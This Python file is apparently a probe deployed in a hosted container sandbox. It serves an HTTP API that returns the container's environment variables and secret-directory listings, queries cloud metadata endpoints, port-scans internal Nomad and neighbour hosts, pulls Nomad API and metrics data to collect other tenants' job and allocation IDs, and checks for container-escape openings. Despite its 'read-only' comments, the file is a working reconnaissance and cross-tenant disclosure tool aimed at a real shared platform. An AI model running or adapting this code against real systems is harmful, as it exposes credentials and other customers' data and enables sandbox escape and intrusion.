import http.server
import json
import os
import platform
import re
import socket
import ssl
import subprocess
import urllib.request
from pathlib import Path


def try_read(path, limit=2000):
    try:
        with open(path, "r", errors="replace") as f:
            return f.read(limit)
    except Exception as e:
        return f"<error reading: {e}>"


def try_run(cmd, timeout=3):
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (out.stdout + out.stderr).strip()[:3000]
    except Exception as e:
        return f"<error running {cmd}: {e}>"


def try_reach(url, timeout=2, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(500)
            return {"reachable": True, "status": resp.status, "body_snippet": body.decode(errors="replace")}
    except Exception as e:
        return {"reachable": False, "error": str(e)}


def tcp_connect(host, port, timeout=1.5):
    try:
        family = socket.AF_INET6 if ":" in host else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return {"open": True}
    except Exception as e:
        return {"open": False, "error": str(e)}


def http_get_raw(host, port, path="/", timeout=2, use_https=False, extra_headers=""):
    try:
        family = socket.AF_INET6 if ":" in host else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect_host = f"[{host}]" if family == socket.AF_INET6 else host
        s.connect((host, port))
        if use_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s)
        req = f"GET {path} HTTP/1.1\r\nHost: {connect_host}\r\nConnection: close\r\n{extra_headers}\r\n"
        s.sendall(req.encode())
        data = b""
        while len(data) < 4000:
            chunk = s.recv(4000)
            if not chunk:
                break
            data += chunk
        s.close()
        return {"ok": True, "response_snippet": data.decode(errors="replace")[:2000]}
    except Exception as e:
        return {"ok": False, "error": str(e)}


ACCOUNT_A_REFERENCE_HOSTS = [
    "fda7:a938:5bfe:5fa6:0:5df:921c:bd78",
    "fda7:a938:5bfe:5fa6:0:5df:7da0:83f",
    "fda7:a938:5bfe:5fa6:0:5df:91f5:6851",
    "fda7:a938:5bfe:5fa6:0:5df:dbf5:263",
    "fda7:a938:5bfe:5fa6:0:5dd:a5bf:5e98",
    "fda7:a938:5bfe:5fa6:0:5df:c92:9552",
]

PROBE_PORTS = [4646, 4647, 8500, 8300, 80, 443, 8080, 22]
DEEP_PORTS = sorted(set(PROBE_PORTS + [
    4648, 8600, 2375, 2376, 2379, 2380, 6443, 10250, 10255, 4194,
    9100, 9090, 9093, 3000, 8200, 9216, 9419, 7001, 7946, 4789, 53, 123, 25, 587
]))
LOCAL_PORTS = [22, 80, 443, 8080, 8443, 9090, 9100, 4646, 4647, 8500, 8300, 8200, 2379, 2380, 10250]
NOMAD_PATHS = [
    "/v1/agent/self",
    "/v1/agent/members",
    "/v1/agent/health",
    "/v1/status/leader",
    "/v1/status/peers",
    "/v1/operator/autopilot/health",
    "/v1/metrics",
    "/v1/nodes",
    "/v1/jobs",
    "/v1/acl/token/self",
    "/v1/namespaces",
]


def parse_infra_hosts_from_etc_hosts():
    hosts = []
    text = try_read("/etc/hosts", 20000)
    if text.startswith("<error"):
        return hosts, text
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"\s+", line)
        if len(parts) < 2:
            continue
        ip, names = parts[0], parts[1:]
        if any("aiven-application-infrastructure.aiven.local" in n for n in names):
            hosts.append({"ip": ip, "names": names})
    return hosts, text


def probe_hosts(hosts, ports=None):
    ports = ports or PROBE_PORTS
    results = {}
    for host in hosts:
        host_result = {}
        for port in ports:
            r = tcp_connect(host, port)
            host_result[str(port)] = r
            if r.get("open") and port in (4646, 8500):
                path = "/v1/agent/members" if port == 4646 else "/v1/catalog/nodes"
                host_result[f"{port}_http_probe"] = http_get_raw(
                    host, port, path=path, use_https=(port == 4646)
                )
        results[host] = host_result
    return results


def find_open_nomad_host(host_results):
    for host, ports in host_results.items():
        if ports.get("4646", {}).get("open"):
            return host
    return None


def test_nomad_api(host, port=4646):
    results = {"target_host": host, "target_port": port, "endpoints": {}}
    if not host:
        results["error"] = "no open Nomad HTTP host found"
        return results
    for path in NOMAD_PATHS:
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ss = ctx.wrap_socket(s)
            req = f"GET {path} HTTP/1.1\r\nHost: [{host}]\r\nConnection: close\r\n\r\n"
            ss.sendall(req.encode())
            data = b""
            while len(data) < 8000:
                chunk = ss.recv(8000)
                if not chunk:
                    break
                data += chunk
            cipher = None
            try:
                cipher = ss.cipher()
            except Exception:
                pass
            ss.close()
            results["endpoints"][path] = {
                "ok": True,
                "tls_cipher": cipher,
                "response_snippet": data.decode(errors="replace")[:4000],
            }
        except Exception as e:
            results["endpoints"][path] = {"ok": False, "error": str(e)}
    return results


def probe_localhost():
    results = {"127.0.0.1": {}, "::1": {}}
    for port in LOCAL_PORTS:
        results["127.0.0.1"][str(port)] = tcp_connect("127.0.0.1", port, timeout=0.8)
        results["::1"][str(port)] = tcp_connect("::1", port, timeout=0.8)
    return results


def list_tree(path, max_entries=80, max_file=1500):
    out = {"path": path, "exists": os.path.exists(path), "entries": []}
    if not out["exists"]:
        return out
    try:
        names = sorted(os.listdir(path))[:max_entries]
    except Exception as e:
        out["error"] = str(e)
        return out
    for name in names:
        full = os.path.join(path, name)
        item = {"name": name, "is_dir": os.path.isdir(full), "is_file": os.path.isfile(full)}
        try:
            item["size"] = os.path.getsize(full)
        except Exception:
            pass
        if item["is_file"] and item.get("size", 0) <= max_file:
            item["content"] = try_read(full, max_file)
        elif item["is_dir"]:
            try:
                item["children"] = sorted(os.listdir(full))[:40]
            except Exception as e:
                item["children_error"] = str(e)
        out["entries"].append(item)
    return out


def parse_proc_net(path):
    """Return listening sockets from /proc/net/tcp{,6}."""
    text = try_read(path, 200000)
    if text.startswith("<error"):
        return {"error": text}
    listeners = []
    lines = text.splitlines()[1:]
    for line in lines:
        parts = line.split()
        if len(parts) < 4:
            continue
        local, state = parts[1], parts[3]
        # state 0A = LISTEN
        if state != "0A":
            continue
        ip_hex, port_hex = local.split(":")
        port = int(port_hex, 16)
        listeners.append({"raw_local": local, "port": port, "state": state, "uid": parts[7] if len(parts) > 7 else None})
    return {"listeners": listeners, "line_count": len(lines)}


def dns_lookup(name):
    out = {"name": name}
    try:
        out["getaddrinfo"] = []
        for fam, typ, proto, canon, sockaddr in socket.getaddrinfo(name, None):
            out["getaddrinfo"].append({"family": fam, "sockaddr": sockaddr, "canon": canon})
    except Exception as e:
        out["error"] = str(e)
    return out


def deep_dive():
    infra, hosts_text = parse_infra_hosts_from_etc_hosts()
    local_ips = [h["ip"] for h in infra]
    local_scan = probe_hosts(local_ips, ports=PROBE_PORTS)
    open_host = find_open_nomad_host(local_scan)

    # Hostnames from /etc/hosts for non-infra interesting targets
    interesting_targets = []
    for line in hosts_text.splitlines():
        parts = re.split(r"\s+", line.strip())
        if len(parts) >= 2 and not line.strip().startswith("#"):
            interesting_targets.append({"ip": parts[0], "names": parts[1:]})

    data = {
        "filesystem": {
            "secrets": list_tree("/secrets"),
            "run_secrets": list_tree("/run/secrets"),
            "alloc": list_tree("/alloc"),
            "local": list_tree("/local"),
            "containerenv": try_read("/run/.containerenv"),
            "proc_self_environ_keys": sorted(
                [l.split("=", 1)[0] for l in try_read("/proc/self/environ", 20000).replace("\x00", "\n").splitlines() if l]
            ),
            "proc_self_cwd": try_run(["readlink", "/proc/self/cwd"]),
            "proc_self_exe": try_run(["readlink", "/proc/self/exe"]),
            "proc_self_mountinfo": try_read("/proc/self/mountinfo", 6000),
            "proc_self_uid_map": try_read("/proc/self/uid_map"),
            "proc_self_gid_map": try_read("/proc/self/gid_map"),
            "proc_self_status_caps": try_run(
                ["sh", "-c", "grep -E '^(Uid|Gid|Cap|NSpid|NoNewPrivs|Seccomp)' /proc/self/status"]
            ),
        },
        "listeners": {
            "tcp": parse_proc_net("/proc/net/tcp"),
            "tcp6": parse_proc_net("/proc/net/tcp6"),
        },
        "dns": {
            "resolv_conf": try_read("/etc/resolv.conf"),
            "infra_lookups": [dns_lookup(h["names"][0]) for h in infra if h.get("names")],
            "special_lookups": [
                dns_lookup("host.containers.internal"),
                dns_lookup("host.docker.internal"),
                dns_lookup("kubernetes.default.svc.cluster.local"),
                dns_lookup("consul.service.consul"),
                dns_lookup("nomad.service.consul"),
            ],
        },
        "local_infra_hosts": infra,
        "local_infra_scan_basic": local_scan,
        "open_nomad_host_deep_ports": probe_hosts([open_host], ports=DEEP_PORTS) if open_host else None,
        "nomad_api_extended": test_nomad_api(open_host) if open_host else None,
        "neighbor_targets_scan": {},
        "safety_note": "read-only connect/GET only; no SSH auth; no Nomad writes; no RPC 4647 protocol",
    }

    # Probe interesting neighbor IPs/ports lightly
    neighbor_hosts = []
    for t in interesting_targets:
        ip = t["ip"]
        if ip in ("127.0.0.1", "::1"):
            continue
        if ip.startswith("fda7:") and "aiven-application-infrastructure" in " ".join(t["names"]):
            continue  # already covered
        neighbor_hosts.append(ip)
    # Always include link-local / pod helpers
    for h in ["169.254.1.1", "169.254.1.2", "169.254.169.254", "host.containers.internal"]:
        if h not in neighbor_hosts:
            neighbor_hosts.append(h)
    neighbor_ports = [22, 53, 80, 443, 8080, 8443, 4646, 4647, 8500, 8300, 2375, 2376, 10250, 9100]
    data["neighbor_targets_scan"] = probe_hosts(neighbor_hosts, ports=neighbor_ports)

    # Account A reference quick check (ports that mattered)
    data["account_a_reference_quick"] = probe_hosts(ACCOUNT_A_REFERENCE_HOSTS, ports=[4646, 22])
    return data


def gather_diagnostics():
    data = {}
    data["hostname"] = socket.gethostname()
    try:
        data["fqdn"] = socket.getfqdn()
    except Exception as e:
        data["fqdn"] = str(e)
    try:
        data["local_ips"] = socket.gethostbyname_ex(socket.gethostname())
    except Exception as e:
        data["local_ips"] = str(e)

    data["platform"] = platform.platform()
    data["kernel_release"] = platform.release()
    data["machine"] = platform.machine()
    data["env"] = dict(os.environ)

    data["proc_self_cgroup"] = try_read("/proc/self/cgroup")
    data["proc_1_cgroup"] = try_read("/proc/1/cgroup")
    data["dockerenv_exists"] = os.path.exists("/.dockerenv")
    data["containerenv_exists"] = os.path.exists("/run/.containerenv")
    data["proc_self_mountinfo"] = try_read("/proc/self/mountinfo", 4000)
    data["proc_self_uid_map"] = try_read("/proc/self/uid_map")
    data["proc_self_gid_map"] = try_read("/proc/self/gid_map")
    data["proc_self_status_caps"] = try_run(
        ["sh", "-c", "grep -E '^(Uid|Gid|Cap|NSpid|NoNewPrivs)' /proc/self/status"]
    )

    data["ip_addr"] = try_run(["ip", "addr"]) if os.path.exists("/usr/sbin/ip") or os.path.exists("/sbin/ip") else try_run(["ifconfig"])
    data["ip_route"] = try_run(["ip", "route"])
    data["resolv_conf"] = try_read("/etc/resolv.conf")
    infra, hosts_text = parse_infra_hosts_from_etc_hosts()
    data["hosts_file"] = hosts_text
    data["infra_hosts_parsed"] = infra

    data["whoami"] = try_run(["whoami"])
    data["id"] = try_run(["id"])
    data["uname_a"] = try_run(["uname", "-a"])
    data["cpuinfo_model"] = try_run(["sh", "-c", "grep 'model name' /proc/cpuinfo | head -1"])
    data["meminfo_total"] = try_run(["sh", "-c", "grep MemTotal /proc/meminfo"])

    data["aws_metadata_v1"] = try_reach("http://169.254.169.254/latest/meta-data/", timeout=2)
    data["aws_metadata_v2_token"] = try_reach(
        "http://169.254.169.254/latest/api/token",
        timeout=2,
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    )
    data["gcp_metadata"] = try_reach(
        "http://169.254.169.254/computeMetadata/v1/",
        timeout=2,
        headers={"Metadata-Flavor": "Google"},
    )
    data["azure_metadata"] = try_reach(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        timeout=2,
        headers={"Metadata": "true"},
    )
    data["digitalocean_metadata"] = try_reach("http://169.254.169.254/metadata/v1/", timeout=2)

    data["k8s_sa_token_exists"] = os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token")
    data["k8s_namespace"] = try_read("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
    data["kubernetes_service_host_env"] = os.environ.get("KUBERNETES_SERVICE_HOST")
    return data



def http_get_unix(sock_path, path="/", timeout=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(sock_path)
        req = f"GET {path} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
        s.sendall(req.encode())
        data = b""
        while len(data) < 200000:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        s.close()
        return {"ok": True, "response_snippet": data.decode(errors="replace")[:120000]}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def novel_sandbox_probe():
    """Focus: sandbox bypass / cross-tenant orchestration disclosure."""
    infra, hosts_text = parse_infra_hosts_from_etc_hosts()
    # Identify which infra ULA is the local host agent
    host_internal = "169.254.1.2"
    open_ulas = []
    for h in infra:
        r4646 = tcp_connect(h["ip"], 4646, timeout=1.2)
        r22 = tcp_connect(h["ip"], 22, timeout=1.2)
        if r4646.get("open") or r22.get("open"):
            open_ulas.append({"ip": h["ip"], "names": h["names"], "4646": r4646, "22": r22})

    # Extended Nomad GETs with large body capture (metrics cross-tenant labels)
    nomad_host = open_ulas[0]["ip"] if open_ulas else None
    large_paths = [
        "/v1/metrics",
        "/v1/agent/health",
        "/v1/acl/token/self",
        "/v1/namespaces",
        "/v1/status/leader",
        "/v1/status/peers",
        "/v1/agent/members",
        "/v1/nodes?resources=false",
        "/v1/jobs?meta=true",
    ]
    network_nomad = {}
    if nomad_host:
        for path in large_paths:
            # reuse test_nomad_api single-path style with bigger buffer
            try:
                s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                s.settimeout(8)
                s.connect((nomad_host, 4646))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ss = ctx.wrap_socket(s)
                req = f"GET {path} HTTP/1.1\r\nHost: [{nomad_host}]\r\nConnection: close\r\n\r\n"
                ss.sendall(req.encode())
                data = b""
                while len(data) < 250000:
                    chunk = ss.recv(65536)
                    if not chunk:
                        break
                    data += chunk
                ss.close()
                network_nomad[path] = {"ok": True, "bytes": len(data), "response_snippet": data.decode(errors="replace")[:120000]}
            except Exception as e:
                network_nomad[path] = {"ok": False, "error": str(e)}

    unix_paths = [
        "/v1/agent/self",
        "/v1/agent/members",
        "/v1/agent/health",
        "/v1/metrics",
        "/v1/status/leader",
        "/v1/status/peers",
        "/v1/nodes",
        "/v1/jobs",
        "/v1/acl/token/self",
        "/v1/namespaces",
    ]
    unix_nomad = {path: http_get_unix("/secrets/api.sock", path) for path in unix_paths}

    # mystery listener 22557 + common sidecar ports
    mystery = {}
    for port in [22557, 8081, 8082, 9090, 9102, 13133, 4317, 4318, 8888, 8126]:
        mystery[str(port)] = {
            "tcp": tcp_connect("127.0.0.1", port, timeout=0.7),
            "http": http_get_raw("127.0.0.1", port, path="/", timeout=1.5) if True else None,
        }
        # if open, try a few paths
        if mystery[str(port)]["tcp"].get("open"):
            for path in ["/", "/health", "/metrics", "/v1/agent/self", "/debug/vars"]:
                mystery[str(port)][f"get_{path}"] = http_get_raw("127.0.0.1", port, path=path, timeout=1.5)

    # host.containers.internal identity check
    host_scan = probe_hosts(["169.254.1.2", "host.containers.internal"], ports=[22, 4646, 4647, 8500])

    # sidecar logs (own alloc only) - may reveal sidecar purpose
    sidecar_log = try_read("/alloc/logs/sidecar.stdout.0", 4000)
    sidecar_err = try_read("/alloc/logs/sidecar.stderr.0", 2000)
    preflight = try_read("/alloc/logs/preflight.stdout.0", 2000)

    # Parse metrics labels for cross-tenant evidence
    cross_tenant = {"remote_service_ids": set(), "job_ids": set(), "alloc_ids": set(), "hosts": set(), "namespaces": set()}
    metrics_body = (network_nomad.get("/v1/metrics") or {}).get("response_snippet") or ""
    # strip HTTP headers
    if "\r\n\r\n" in metrics_body:
        metrics_body = metrics_body.split("\r\n\r\n", 1)[1]
    # chunked: crude extract JSON object
    import re as _re
    for m in _re.finditer(r'"remote_service_id":"([^"]+)"', metrics_body):
        cross_tenant["remote_service_ids"].add(m.group(1))
    for m in _re.finditer(r'"job":"([^"]+)"', metrics_body):
        cross_tenant["job_ids"].add(m.group(1))
    for m in _re.finditer(r'"alloc_id":"([^"]+)"', metrics_body):
        cross_tenant["alloc_ids"].add(m.group(1))
    for m in _re.finditer(r'"host":"([^"]+)"', metrics_body):
        cross_tenant["hosts"].add(m.group(1))
    for m in _re.finditer(r'"namespace":"([^"]+)"', metrics_body):
        cross_tenant["namespaces"].add(m.group(1))
    cross_tenant = {k: sorted(v) for k, v in cross_tenant.items()}

    return {
        "hypothesis": "host.containers.internal Nomad agent reachable from customer Runtime sandbox; /v1/metrics may disclose other tenants' alloc labels; /secrets/api.sock may differ in ACL",
        "open_infra_ulas": open_ulas,
        "host_containers_internal_scan": host_scan,
        "network_nomad_large": network_nomad,
        "unix_socket_nomad": unix_nomad,
        "mystery_local_ports": mystery,
        "sidecar_stdout": sidecar_log,
        "sidecar_stderr": sidecar_err,
        "preflight_stdout": preflight,
        "cross_tenant_metrics_labels": cross_tenant,
        "secrets_listing": list_tree("/secrets"),
        "api_sock_stat": try_run(["sh", "-c", "ls -la /secrets/api.sock; stat /secrets/api.sock; file /secrets/api.sock 2>/dev/null || true"]),
    }



def escape_recon():
    """Read-only sandbox-escape reconnaissance. No exploit payloads."""
    import stat as statmod
    results = {
        "goal": "Determine if novel container escape primitives exist beyond network/metrics finding",
        "safety": "read-only filesystem/proc/net probes only",
    }

    # Identity / privilege
    results["identity"] = {
        "uid_map": try_read("/proc/self/uid_map"),
        "gid_map": try_read("/proc/self/gid_map"),
        "status": try_run(["sh", "-c", "grep -E '^(Uid|Gid|Cap|NSpid|NoNewPrivs|Seccomp|Speculation)' /proc/self/status"]),
        "id": try_run(["id"]),
        "uname": try_run(["uname", "-a"]),
        "containerenv": try_read("/run/.containerenv", 4000),
    }

    # Runtime version fingerprints
    results["runtime_versions"] = {
        "podman": try_run(["podman", "--version"]),
        "crun": try_run(["crun", "--version"]),
        "runc": try_run(["runc", "--version"]),
        "which": try_run(["sh", "-c", "command -v podman; command -v crun; command -v runc; ls /usr/bin/*run* 2>/dev/null | head"]),
    }

    # Devices / sys
    def safe_listdir(path, n=100):
        try:
            return sorted(os.listdir(path))[:n]
        except Exception as e:
            return [f"<error: {e}>"]

    results["devices"] = {
        "dev": safe_listdir("/dev"),
        "dev_pts": safe_listdir("/dev/pts"),
        "sys_fs_cgroup": safe_listdir("/sys/fs/cgroup"),
        "sys_firmware": safe_listdir("/sys/firmware")[:20] if os.path.exists("/sys/firmware") else None,
    }

    # Sensitive proc knobs (read-only)
    results["proc_knobs"] = {
        "core_pattern": try_read("/proc/sys/kernel/core_pattern"),
        "unprivileged_userns_clone": try_read("/proc/sys/kernel/unprivileged_userns_clone"),
        "dmesg_restrict": try_read("/proc/sys/kernel/dmesg_restrict"),
        "kptr_restrict": try_read("/proc/sys/kernel/kptr_restrict"),
        "cmdline": try_read("/proc/cmdline", 1000),
        "self_cgroup": try_read("/proc/self/cgroup"),
        "self_mountinfo": try_read("/proc/self/mountinfo", 8000),
        "self_root_link": try_run(["readlink", "/proc/self/root"]),
        "1_root_link": try_run(["readlink", "/proc/1/root"]),
        "1_cwd": try_run(["readlink", "/proc/1/cwd"]),
        "apparmor": try_read("/proc/self/attr/current"),
        "selinux_context_try": try_run(["sh", "-c", "cat /proc/self/attr/current 2>/dev/null; ls -laZ / 2>/dev/null | head -5"]),
    }

    # Mount / path traversal style checks (read-only existence)
    candidates = []
    mi = try_read("/proc/self/mountinfo", 20000)
    # From mountinfo, collect host-looking sources
    for line in mi.splitlines():
        parts = line.split()
        if len(parts) >= 5:
            candidates.append(parts[3])  # root
            candidates.append(parts[4])  # mountpoint
    # Explicit interesting paths
    explicit = [
        "/alloc", "/alloc/..", "/alloc/../..", "/alloc/../../..",
        "/local", "/local/..",
        "/secrets", "/secrets/api.sock",
        "/run/podman", "/run/podman/podman.sock",
        "/var/run/docker.sock", "/run/docker.sock",
        "/var/run/crio/crio.sock",
        "/sys/fs/cgroup", "/sys/kernel/security",
        "/proc/sysrq-trigger",
        "/home", "/root", "/opt/nomad", "/opt/nomad/data", "/opt/nomad/data/alloc",
    ]
    # Sibling alloc guess: same parent dir as our alloc id from mountinfo
    m = re.search(r"/opt/nomad/data/alloc/([0-9a-f-]+)/", mi)
    our_alloc = m.group(1) if m else None
    if our_alloc:
        explicit += [
            f"/alloc/../{our_alloc}",
            f"/opt/nomad/data/alloc/{our_alloc}",
            f"/opt/nomad/data/alloc/",
        ]
        # try listing via /proc/self/root join won't help; try common relative escapes
        explicit += [
            "/alloc/../logs",
            "/alloc/../../",
        ]

    path_probe = {}
    for path in sorted(set(explicit)):
        info = {"exists": os.path.exists(path), "is_dir": os.path.isdir(path), "is_file": os.path.isfile(path), "is_link": os.path.islink(path)}
        try:
            st = os.lstat(path)
            info["mode"] = oct(st.st_mode)
            info["uid"] = st.st_uid
            info["gid"] = st.st_gid
            info["size"] = st.st_size
            info["sock"] = statmod.S_ISSOCK(st.st_mode)
        except Exception as e:
            info["stat_error"] = str(e)
        if info["is_dir"] and info["exists"]:
            try:
                info["children"] = sorted(os.listdir(path))[:50]
            except Exception as e:
                info["list_error"] = str(e)
        if info.get("is_file") and info.get("size", 0) and info["size"] <= 2000 and path.endswith(('.env', 'current', 'core_pattern')):
            info["content"] = try_read(path, 2000)
        path_probe[path] = info
    results["path_probe"] = path_probe
    results["our_alloc_id"] = our_alloc

    # Try to read foreign alloc dirs if /opt/nomad/data/alloc listable
    foreign = {}
    alloc_root = "/opt/nomad/data/alloc"
    if os.path.isdir(alloc_root):
        try:
            kids = sorted(os.listdir(alloc_root))[:30]
            foreign["list"] = kids
            for kid in kids[:5]:
                foreign[kid] = safe_listdir(os.path.join(alloc_root, kid), 20)
        except Exception as e:
            foreign["error"] = str(e)
    else:
        foreign["reachable"] = False
    results["foreign_alloc_access"] = foreign

    # Overlay lowerdir accessibility
    overlay_paths = re.findall(r'(?:lowerdir|upperdir|workdir)=([^,\s]+)', mi)
    ov = {}
    for op in overlay_paths[:20]:
        # lowerdir can be colon-separated
        for piece in op.split(':'):
            ov[piece] = {"exists": os.path.exists(piece), "listdir_error": None}
            if ov[piece]["exists"] and os.path.isdir(piece):
                try:
                    ov[piece]["children"] = sorted(os.listdir(piece))[:20]
                except Exception as e:
                    ov[piece]["listdir_error"] = str(e)
    results["overlay_path_access"] = ov

    # Traefik / mystery ports (sidecar shares netns)
    ports = [8080, 80, 443, 8081, 8082, 8443, 9000, 8090, 8888, 9999, 22766, 22557, 9100, 4194, 10250]
    # also parse current listeners
    for netf in ("/proc/net/tcp", "/proc/net/tcp6"):
        text = try_read(netf, 200000)
        for line in text.splitlines()[1:]:
            parts = line.split()
            if len(parts) > 3 and parts[3] == "0A":
                port = int(parts[1].split(":")[1], 16)
                ports.append(port)
    ports = sorted(set(ports))
    port_scan = {}
    for port in ports:
        r = tcp_connect("127.0.0.1", port, timeout=0.5)
        entry = {"tcp": r}
        if r.get("open"):
            for path in ["/", "/api/rawdata", "/api/http/routers", "/dashboard/", "/ping", "/health", "/metrics", "/version"]:
                entry[path] = http_get_raw("127.0.0.1", port, path=path, timeout=1.2)
        port_scan[str(port)] = entry
    results["localhost_listeners_probe"] = port_scan

    # Nomad unix socket ACL vs network already known; re-check perms only
    results["api_sock"] = {
        "stat": try_run(["sh", "-c", "ls -la /secrets; ls -la /secrets/api.sock 2>&1; id"]),
        "connect": http_get_unix("/secrets/api.sock", "/v1/agent/self") if 'http_get_unix' in globals() else {"skipped": True},
    }

    # Summary heuristics
    red_flags = []
    if "0       0" in (results["identity"]["uid_map"] or ""):
        red_flags.append("uid_map maps container 0 to host 0 (privileged)")
    if os.path.exists("/var/run/docker.sock") or os.path.exists("/run/podman/podman.sock"):
        red_flags.append("container runtime socket mounted")
    if results["foreign_alloc_access"].get("list"):
        red_flags.append("can list /opt/nomad/data/alloc (sibling allocs)")
    if any(v.get("exists") for k,v in results["overlay_path_access"].items() if "/home/" in k or "containers/storage" in k):
        red_flags.append("host overlay storage path reachable from inside")
    # open unexpected localhost admin
    for port, entry in port_scan.items():
        if entry.get("tcp", {}).get("open") and port not in ("8080",):
            # check if traefik api returned data
            for path in ("/api/rawdata", "/api/http/routers", "/dashboard/"):
                resp = str(entry.get(path, {}))
                if "200" in resp and "traefik" in resp.lower():
                    red_flags.append(f"Traefik API/dashboard open on :{port}{path}")
    results["red_flags"] = red_flags
    results["escape_likely"] = bool(red_flags)
    return results


class Handler(http.server.BaseHTTPRequestHandler):
    def _json(self, data, code=200):
        body = json.dumps(data, indent=2, default=str).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        try:
            if self.path.startswith("/escape"):
                self._json(escape_recon())
                return
            if self.path.startswith("/novel"):
                self._json(novel_sandbox_probe())
                return
            if self.path.startswith("/deep"):
                self._json(deep_dive())
                return
            if self.path.startswith("/localhost-probe"):
                self._json(probe_localhost())
                return
            if self.path.startswith("/probe-internal"):
                infra, _ = parse_infra_hosts_from_etc_hosts()
                local_ips = [h["ip"] for h in infra]
                data = {
                    "local_infra_hosts": infra,
                    "local_infra_scan": probe_hosts(local_ips),
                    "account_a_reference_scan": probe_hosts(ACCOUNT_A_REFERENCE_HOSTS),
                }
                self._json(data)
                return
            if self.path.startswith("/nomad-api-test"):
                infra, _ = parse_infra_hosts_from_etc_hosts()
                local_ips = [h["ip"] for h in infra]
                local_scan = probe_hosts(local_ips)
                host = find_open_nomad_host(local_scan)
                source = "local_infra"
                if not host:
                    ref_scan = probe_hosts(ACCOUNT_A_REFERENCE_HOSTS)
                    host = find_open_nomad_host(ref_scan)
                    source = "account_a_reference" if host else "none"
                data = {
                    "selected_host_source": source,
                    "local_infra_open_4646": {
                        h: p.get("4646") for h, p in local_scan.items() if p.get("4646", {}).get("open")
                    },
                    "nomad_api": test_nomad_api(host),
                }
                self._json(data)
                return
            self._json(gather_diagnostics())
        except Exception as e:
            self._json({"error": str(e)}, code=500)

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8080"))
    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    print(f"listening on 0.0.0.0:{port}", flush=True)
    server.serve_forever()
